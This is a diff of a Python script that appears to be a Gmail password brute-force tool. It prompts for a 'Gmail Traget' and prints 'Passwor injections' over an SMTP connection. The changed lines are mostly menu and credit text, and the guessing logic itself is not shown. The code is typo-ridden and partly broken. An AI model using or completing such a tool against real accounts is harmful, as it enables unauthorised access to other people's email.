@@ -2,12 +2,11 @@ import smtplib
 smtpserver = smtplib.SMTP("smtp.gmail.com:587")
 smtpserver.ehlo()
 smtpserver.starttls()
-#ff2222
-print("\t created by chanel Tech learn")
+print("\t Created by Tech learn")
 print("\n\n\n")
-print(">>>UINUM[1]  Enter Your Gmail Traget   ")
-print(">>>> NUM[2]  help ")
-print(">>>> NUM[3]  Exit ")
+print(">>>> ID[1]  Enter Your Gmail Traget   ")
+print(">>>> ID[2]  help ")
+print(">>>> ID[3]  Exit ")
 print("\n")
 UID = input("Enter  Your  ID  :  ")
 UID = int(UID)
@@ -26,8 +25,8 @@ def ano ():
                 print("Passwor injections  :  ",password)
         input("Enter Your Continue  :  ")
     else:
-        print(">>>no gmail")
-        y = input(">>>rty agin please (y,n)")
+        print(">>>not gmail")
+        y = input(">>>rty agin (y,n)")
         if(y == "y"):
             ano()
         if(y == "n"):
@@ -46,16 +45,16 @@ def ano ():
             exit
         
 def help():
-    print("\t \tCreate By Tech learn")
-    print("\t \t subscribe our YT chanel for more learning)
-    print("\t \t join our telegram chanel t.me/h4ker_moking")
+    print("\t \created By Tech learn")
+    print("\t \t     model  1.0")
+    print("\t \t Yt  :  Tech learn")
     print("\n\n\n\n\n\n")
     print("\n\n\n")
-    print(">>>> NUM[1]  Enter Your Gmail Traget   ")
-    print(">>>> NUM[2]  help ")
-    print(">>>> NUM[3]  Exit ")
+    print(">>>> ID[1]  Enter Your Gmail Traget   ")
+    print(">>>> ID[2]  help ")
+    print(">>>> ID[3]  Exit ")
     print("\n")
-    UID = input("Enter  the number  you want  :  ")
+    UID = input("Enter  Your  ID  :  ")
     UID = int(UID)
     if(UID == 1):
         ano()
